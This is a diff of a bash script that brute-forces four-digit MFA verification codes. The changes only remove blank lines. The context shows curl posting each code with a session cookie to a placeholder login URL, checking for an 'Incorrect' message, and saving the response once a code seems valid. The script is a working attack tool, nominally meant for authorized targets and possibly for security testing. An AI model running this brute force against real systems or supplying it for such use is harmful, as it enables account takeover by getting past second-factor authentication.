@@ -15,18 +15,11 @@
 #
 # ====================================================================================================
 
-
 # Target MFA verification endpoint. Change this URL according to your authorized target
 URL="https://target-website.com/login"
 
-
 # Cookie obtained after authentication. Replace this value with your own  cookie
 COOKIE="your-cookie"
-
-
-
-
-
 
 # Generate all possible 4-digit MFA codes
 #
@@ -51,7 +44,6 @@ do
         -H "Cookie: $COOKIE" \
         --data "mfa-code=$code")
 
-
     # Check the server response
     #
     # The word "Incorrect" is an example. You may need to change it depending on the application's error message.
@@ -70,11 +62,9 @@ do
 
         echo "[+] Possible valid MFA code found: $code"
 
-
         # Save the server response for manual analysis
 
         echo "$response" > success_response.html
-
 
         # Stop the brute force process
 
